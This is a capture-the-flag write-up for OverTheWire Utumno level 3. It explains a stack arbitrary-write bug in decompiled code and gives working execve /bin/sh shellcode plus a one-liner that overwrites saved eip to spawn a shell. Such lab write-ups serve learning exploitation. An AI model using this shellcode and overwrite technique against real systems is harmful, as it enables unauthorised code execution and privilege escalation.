# Overthewire Utumno Level 3 Writeup

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx@2
  int v5; // [sp+8h] [bp-3Ch]@2
  int v6; // [sp+20h] [bp-24h]@2
  int v7; // [sp+38h] [bp-Ch]@1
  signed int i; // [sp+3Ch] [bp-8h]@1

  v7 = 0;
  for ( i = 0; ; ++i )
  {
    v7 = getchar();
    if ( v7 == -1 || i > 23 )
      break;
    *((_BYTE *)&v5 + i) = v7;
    *((_BYTE *)&v5 + i) ^= 3 * (_BYTE)i;
    v3 = *((_BYTE *)&v5 + i);
    *((_BYTE *)&v6 + v3) = getchar();
  }
  return 0;
}
```

Above is the decompiled version of the program from IDA. The program demands input and puts it somewhere on the stack.
I need to simplify the equations above.

```
*((_BYTE *)&v6 + getchar() ^ (3 * i)) = getchar()
```

I control getchar() so I can write anything into any address.
Since saved eip is placed on ebp + 0x4, after some calculations the chars I need are `\x2c`, `\x2e`, `\x28` and `\x26`.
2 addresses consist a round. The first getchar() forms the address you want to write. The second one is the actual content.

Export the shellcode and get the address:

```bash
$ export SC=$(python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
$ getenv SC ./utumno3
SC will be at 0xffffdef9
$ (python -c 'print "\x2c\xf9\x2e\xde\x28\xff\x26\xff"+"\n"*15';cat)|./utumno3
/usr/bin/whoami
utumno4
```

Enjoy the flag.
